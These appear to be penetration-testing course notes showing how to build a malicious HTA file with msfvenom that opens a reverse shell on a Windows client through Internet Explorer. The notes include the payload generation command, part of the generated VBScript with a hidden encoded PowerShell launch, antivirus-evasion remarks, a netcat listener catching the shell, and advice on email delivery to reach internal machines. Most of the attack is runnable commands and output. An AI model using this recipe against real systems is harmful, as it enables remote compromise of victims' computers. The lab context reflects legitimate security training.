we will use msfvenom to turn the .hta app into an attack. Using hta-psh output format to create an HTA payload based on powershell. 
**evil.hta**
`sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f
hta-psh -o /var/www/html/evil.hta`

Lets look into it:
`sudo cat /var/www/html/evil.hta`
```
<script language="VBScript">
window.moveTo -4000, -4000
Set iKqr8BWFyuiK = CreateObject("Wscript.Shell")
Set t6tI2tnp = CreateObject("Scripting.FileSystemObject")
For each path in Split(iKqr8BWFyuiK.ExpandEnvironmentStrings("%PSModulePath%"),";")
If t6tI2tnp.FileExists(path + "\..\powershell.exe") Then
iKqr8BWFyuiK.Run "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg...
...
```

First note that variable names are randomized to avoid AV. 

Note the Run method arugments:
**-nop** short for **-NoProfile**. Tells powershell to NOT load the powershell user profile. 

**-w hidden** short for **-WindowStyle hidden** to avoide creating a window on the user's desktop.

**-e** short for **-EncodedCommand** allows us to supply a Base64 encoded PS script as a command line argument.

How the new HTA app on our Kali machine and launch a NC listener to test the attack. 

Emulate victim browsing to malicious URL and accepting two security warnings. We should catch a reverse shell. 

`nc -lnvp 4444`
```
listening on [any] 4444 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50260
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\Offsec>
```


This attack compromises an windows client view IE without prescence of a specific software vuln. Since the link is delivered to the HTML app via email, we can compromise NAT'd internal clients.